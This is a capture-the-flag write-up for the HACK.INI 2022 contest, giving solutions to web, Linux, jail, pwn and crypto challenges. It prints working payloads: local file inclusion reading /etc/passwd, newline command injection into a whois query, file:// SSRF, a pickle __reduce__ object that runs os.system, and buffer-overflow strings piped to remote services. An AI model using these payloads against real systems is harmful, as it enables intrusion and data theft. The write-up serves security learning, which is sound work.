# HACK.INI 10th edition 2022

**Author : Aghiles Gharbi**

**TeamName : AnonyBlasBlas**

**Junior : 2nd place**

**Senior : 5th place**

**Individual : 5th**

**team members:**

> Aghiles Gharbi

> Zamoum Amar

> Negazzi Med amine

> Taleb Zineb

> Saradouni Safia

## Web

### baby lfi

> Author : Anis Chebah

> level: so easy

> link : https://baby-lfi.challs.shellmates.club/

    The website has a simple basic lfi (local file inclusion) in the 'language' GET parameter where it just passes the language parameter to include function in php without cheking.

    so the solutuin was just giving the file to read in the language parameter.
> exploit : 'https://baby-lfi.challs.shellmates.club/?language=/etc/passwd'

> flag: shellmates{10CA1_F11e_1Nc1US10n_m4y_r3ve4l_in7Er3st1nG_iNf0Rm4t1on}

### lfi

> Author : Anis Chebah

> level: so easy

> link : 'https://lfi.challs.shellmates.club'

    The website has a simple basic lfi (local file inclusion) in the 'language' GET parameter but in this time they added a filter for (relative paths by removing the '../') where in my case i used the same payload to get the flag because our payload dosn't contain '../'

> exploit : 'https://lfi.challs.shellmates.club/?language=/etc/passwd'

> flag: shellmates{SH0uLD_H4Ve_MadE_th3_checK_recuRS1V3}

### baby lfi 2

> Author : Anis Chebah

> level: so easy

> link : 'https://baby-lfi-2.challs.shellmates.club/'

    The website has a simple lfi (local file inclusion) in the 'language' GET parameter where it passes the language parameter to include function after checking if it contains "./languages/" (my best guess), but this one it was a bit tricky because i "language=languages/" should work without the './'.

    So the solutuin was just giving the file to read in the language parameter.
> exploit : 'https://baby-lfi-2.challs.shellmates.club/?language=./languages/../../../../../../../etc/passwd'

> flag: shellmates{yOU_M4De_yOUr_waY_7hRough_iT}

### HEADache

> Author : Muhammad

> level: so easy

> link : 'https://headache.challs.shellmates.club/'

> file : app.py

    The challenge is simple flask web app, as we can see in the app.py it check for the http header "wanna-something" if it contains "can-i-have-a-flag-please" it just gives us the flag we can add the header from browser inspector or burp suite.

> exploit : add "Wanna-something: can-i-have-a-flag-please" in the http request

> flag : shellmates{hTTp_H34d37R5_&_p0L173N355_c4n_B3_U53FULL}

### Whois 

> Author : souad

> level : medium

> link : 'https://whois.challs.shellmates.club'

    The challenge is a whois online service, where we select a whois host and write a domain name to query, we can see that there is a file named query.php which handles the requests by taking the two GET parameters host and query, if we remove the parameters we get its php source code. Which executes the whois command by the given parametes.

```php
$output = shell_exec("/usr/bin/whois -h ${host} ${query}");
```

    In the code we can see two regex patterns:

```php
$host_regex = "/^[0-9a-zA-Z][0-9a-zA-Z\.-]+$/";
$query_regex = "/^[0-9a-zA-Z\. ]+$/";
```

    if we read a little bit about the [PRCE modifiers (pattern modifiers)](https://www.php.net/manual/en/reference.pcre.pattern.modifiers.php) we can see that in php by default the regex matches only the first line, so we can add a line break in the parameter which will execute mutiple commands separated with '\n' which is coded as %0a in the url.

> exploit : 'http:/whois.challs.shellmates.club/query.php?host=xxx%0a&query=cat+flag.txt'

> flag: shellmates{i_$h0U1D_HaVE_R3AD_7HE_dOc_W3Ll}

### Whois fixed

    A web-based Whois service
    Note : There was a problem with the first version, this is the fixed version.
> Author : souad

> level : medium

> link : 'https://whois-fixed.challs.shellmates.club'

    In this challenge they just renamed the flag we can notice that by executing 'ls' the flag was just renamed to 'thisistheflagwithrandomstuffthatyouwontguessJUSTCATME' we can just cat it

> exploit : 'https:/whois-fixed.challs.shellmates.club/query.php?host=xxx%0A&query=cat+thisistheflagwithrandomstuffthatyouwontguessJUSTCATME'

> flag : shellmates{i_$h0U1D_HaVE_R3AD_7HE_dOc_W3Ll_9837432986534065}

### nextGen 1

    simple monitoring app.

    Note : Flag is in the /flag.txt file of the web server

> Author : souad

> level : easy

> link : 'https://nextgen-1.challs.shellmates.club'

    The challenge was simple monitoring app, we notice that when we click on a departement on the menu a POST request is sent to /request with the parameter service which contains a link (local webserver), hmmm i smell an SSRF (server side request forgery), after somme attempts we can see that there is no filters for file:// so the exploit is just to get the file with file:///flag.txt

> exploit : POST /request with parameters service=file:///flag.txt

> flag : shellmates{1T_W4S_4_qu1T3_3s4y_expl01tabL3_$$Rf}

### nextGen 2 

    We added some filters now.

```python
@app.route("/request", methods=['POST'])
def serve():
    url = request.form['service']
    html = ''
    if search(r'(localhost|127.0.0.1|0.0.0.0)', url) :
        html = render_template("error-404.html")
    else :
        if search(r'[a-z]+://[a-z0-9.-]+/', url):
            with urlopen(url) as response:
                html = response.read()        
            
    return html
```

    Note : Flag is in the /flag.txt file of the web server

> Author : souad
> link : 'https://nextgen-2.challs.shellmates.club'

    the exploit is the same as nextGen 1, they just added some filters

> exploit : POST /request with parameters service=file://hr.dep.nextgen.org/flag.txt

> flag : shellmates{1T_W4S_4_qu1T3_3s4y_expl01tabL3_$$Rf}

## Linux

### diff

> Author : Ouxs

    the challenge is a linux container which contains the flag in the / directory but we don't have permission to read it. i checked for suid binaries but nothing, then i did sudo -l to list the commands that users can execute with sudo, i saw that we can execute diff with sudo with the username ctf-cracked, now we will just diff the flag with any other file to get the flag.

> exploit : sudo -u ctf-cracked diff flag.txt /etc/passwd

> flag : shellmates{You_ma$tered_th3_t00L}

### remote

> Author : Ouxs

    the challenge is a linux container which contains the flag in the / directory but the ssh login script always exits instantly, so the trick is to execute a command before the login script, we can do it with ssh by adding the command as the last argument.

> exploit : ssh ctf@remote -o ProxyCommand="openssl s_client -quiet -connect remote.challs.shellmates.club:443 -servername remote.challs.shellmates.club" "cat /flag.txt"

> flag : shellmates{HOW_DID_U_M4d3_i7_HERE!}

### Welcome

> Author : Ouxs

    the challenge is to find the flag in this linux container, we can see that the welcome message is diffrent comparing to other machines, so the first thing is to find how it is printing this message. after a while we found that the /etc/update-motd/01-custom contains the scripts that print the wellcome message, we can see a commented line contains f379bbf265604f3514cda4aadbc05137

> flag : shellmates{f379bbf265604f3514cda4aadbc05137}



## Jail

### baby jail 1

> Author : Ouxs

    the challenge is a custom python interpreter where we need to open and read the flag file.
> exploit : open("flag.txt").read()

> flag : shellmates{D0n'7_m3$$_W17H_EVAL_kID0}

### baby jail 2

> Author : Ouxs

    the challenge is a custom python interpreter where the added some filters, if we print the globals we can see a BLACKLIST array containig blacklisted words, so i just clear that array then execute the same command of baby jail 1.
> exploit : BLACKLIST.clear() then open("flag.txt").read()

> flag : shellmates{Y0u_ar3_st4rting_t0_g3t_g00d_with_LAVE}

### less_jail

> Author : 1m4D

    in this challenge when we ssh we get a less editor, we need just to execute a shell command by pressing on !, then cat the real flag

> exploit : ! then cat real_flag

> flag : shellmates{My_LE$$_J41L_1S_VERy_We4K_76423}

### pickle_games 1

> Author : chenx3n

    in this challenge they gave us a python script, which it reads a data in hex then deserialize it with pickle so the challenge here is to serialize an object that can lead us to the flag.

```python
#!/usr/bin/env python3
import pickle

def check(data):
    return len(data) <= 400

if __name__ == "__main__":
    print("Welcome to the pickle games! (Level 0)")
    data = bytes.fromhex(input("Enter your hex-encoded pickle data: "))
    if check(data):
        result = pickle.loads(data)
        print(f"Result: {result}")
    else:
        print("Check failed :(")
```

#### try 1

    in the first try i created a class and redefine the __repr__ function which is called everytime we try to print an object.
    but i had a problem that on the server side i get an error of class undefined before we reach the print line, so at this time i was thinking if there is a function that will be executed before the object creation,

```python
class MYClass():
    def __repr__(self):
        return open("flag.txt").read()

import pickle

filename = 'dump'
outfile = open(filename,'wb')

pickle.dump(MYClass(), outfile)
```
#### try 2

    after some research i found the reduce function which was used in a lot of ctfs, i created a class and redefined the __reduce__ method and it WORKS XD.

exploit:
```python
class MYClass():
    def __reduce__(self):
        command = ('cat flag.txt')
        return os.system, (command,)

import pickle

filename = 'dump'
outfile = open(filename,'wb')

pickle.dump(MYClass(), outfile)
```

> flag : shellmates{lEt_thE_piCkl3_gaMeS_BegiN!}

### JsandboxS

    Just a casual JS jail. Retrieve the flag and get out of this jail.

> Author : yh_0x7

In this challenge they give us a js code which has a generator function "func" which prints the flag, and a function that takes input and validates it with a regex filter then passes it to the eval function.

if we read the regex we can see that our goal is to call the func function without parenthesis, if we do some research we can find a lot a methods for example in our case we used : [...{[Symbol.iterator]:func}] which did the trick.

```javascript
#!/usr/bin/env node
var fs = require('fs');

const black_list = "0123456789!\"#$%&'()*+-/;<>?@\\^|~\t\n\r\x0b\x0c "

function * func(){
    fs.readFile('./.passwd', 'utf8', function(err, data){
        console.log(data);
    });
}

const readline = require("readline");
const interface = readline.createInterface({
        input: process.stdin,
        output: process.stdout,
    });

interface.question(
    "Welcome to JsandboxS, I gave you a secret phone, you have use it to escape \n",
    function (input) {
        interface.close();
        if ( !black_list.split("").some(x => input.includes(x)) )
        {
            try 
            {
                eval(input)
            }
            catch(e)
            {
                    console.log('you can\'t break the walls :(')
            }
        }
        else
        {
            console.log('you still in jail...you can\'t escape like that')
        }
    }

);
```

> exploit : [...{[Symbol.iterator]:func}]

> flag : shellmates{y0U_d0N'7_P4r3n7H3515_70_c4Ll_M3}


## PWN

### B0F0

> Author : 1m4D

    In this challenge we have a binary file and it's source code, when we read the .c file we can see the gets which do a bufferoverflow, the goal in this challenge is to change the date to 2752022 by using the buffer overflow. so i just coded the number in hex and add it after the bufferoverflow offset.

```python
from pwn import *

payload = 'a' * 128 + "\x16\xfe\x29\x00"

print(payload)

p = process('./challenge')

sep = " \n "

p.sendline(payload)
output = p.recvall()
print(output)
```

> exploit : printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x16\xfe\x29\x00" | ncat -v --ssl bof0.challs.shellmates.club 443

> flag : shellamtes{Y0u_H4vE_ChE4ngED_mY_V4R14Ble_98765}


### B0F0

> Author : 1m4D

    In this challenge we have a binary file and it's source code, when we read the .c file we can see the gets which do a bufferoverflow, the goal in this challenge is to ret addr to the open_shell function wich has the addr 0x080491b6 and pass the parameter (int)1337.

```python
from pwn import *

#080491b6
payload = 'a' * 32 + "\xb6\x91\x04\x08" + "aaaa" + "\x39\x05\x00\x00"

print(payload)

p = process('./challenge')

sep = " \n "

p.sendline(payload)
output = p.recvall()
print(output)
```

> exploit : printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb6\x91\x04\x08aaaa\x39\x05\x00\x00\ncat flag" | ncat -v --ssl bof1.challs.shellmates.club 443

> flag : shellamtes{Y0u_4lS0_GET_A_$HEll_65431}


## Crypto

### Steam Locomotive

    I wrote a message, but a train ran over it and messed it up, can you recover it? Do you know what the sl command do?

> Author : badsUwU

    In this challenge they gave us a file 'enc' which contains encrypted text, so we should just find which encryption method that they used, the challenge name is steam locomotive so the encryption method will be similar, after some research we can find the Rail Fence Cipher which did the trick for us.

> flag : shellmates{u$e_L$_Not_$l_t0_LI$T_7h3_con7En7_0f_4_diREC70rY}


### neighbors

> level : easy/medium

    They say it's such a rookie mistake to do.
    Can you find it?
    
> Author : Ouxs

    In this challenge they gave us the script which they used to crete chall file wich contains the encrypted text, we can see that they used the RSA algorithm and we can see the q and e that we can use to encrypt the text.

> exploit : rsactftool -n {the N number} -e {the e number} -uncipher {the c}

> flag : shellmates{F3RM47_H4S_Ju57_T0Ok_R$A_D0WN}

### Night Coder

    I am a night coder, are you? 

> Author : Chih3b

    In thi challenge they gave us a python script that seeds with current date then chuffles the flag, and we have the resultant flag, so in this case we should define unshuffle wich reverses shuffle function and brute force the seed(its around thursday at 00:00 until 12:00 (morning))

```python
import random 
import datetime
from secret import flag

#Im a night coder, i coded this at night (thursday morning)

def seed_shuffler(my_list, seed):
  random.seed(seed)
  random.shuffle(my_list)
  return my_list

seed=int(datetime.datetime.now().strftime('%Y%m%d%H%M'))

flag = [f for f in flag]
enc = seed_shuffler(flag,seed)

print("".join(enc))

#result at that time: "N_gs{aesD_he_3AtrsOLlh3ROT1sECRl0m}s"
```

    after editing the script we have

```python

import random 
import datetime
from datetime import timedelta
import numpy as np

#Im a night coder, i coded this at night (thursday morning)
def seed_shuffler(my_list, seed):
  random.seed(seed)
  random.shuffle(my_list)
  return my_list

def unshuffle_list(shuffled_ls, seed):
  n = len(shuffled_ls)
  # Perm is [1, 2, ..., n]
  perm = [i for i in range(1, n + 1)]
  # Apply sigma to perm
  shuffled_perm = shuffle_under_seed(perm, seed)
  # Zip and unshuffle
  zipped_ls = list(zip(shuffled_ls, shuffled_perm))
  zipped_ls.sort(key=lambda x: x[1])
  return [a for (a, b) in zipped_ls]

flag = "N_gs{aesD_he_3AtrsOLlh3ROT1sECRl0m}s"

flag = [f for f in flag]

for i in range(100000):

  seed=int((datetime.datetime.now() - timedelta(minutes=i)).strftime('%Y%m%d%H%M'))
  
  enc = seed_shuffler(flag.copy(),seed)
  dec = unshuffle_list(flag.copy(), seed)

  if "shellmates" in "".join(dec):
    print(seed)
    print("".join(enc))
    print("".join(dec))
    break

#result at that time: "N_gs{aesD_he_3AtrsOLlh3ROT1sECRl0m}s"
```

> flag : shellmates{N1ghT_C0D3Rs_ArE_LOOs3Rs} 


## forensics

### lies

    I asked my friend where is he, he lied to me through this picture, can you find the datetime of the pic and prove me right?
    Flag format shellmates{YY:MM:DD} 
> Author : Chih3b

to be continued <<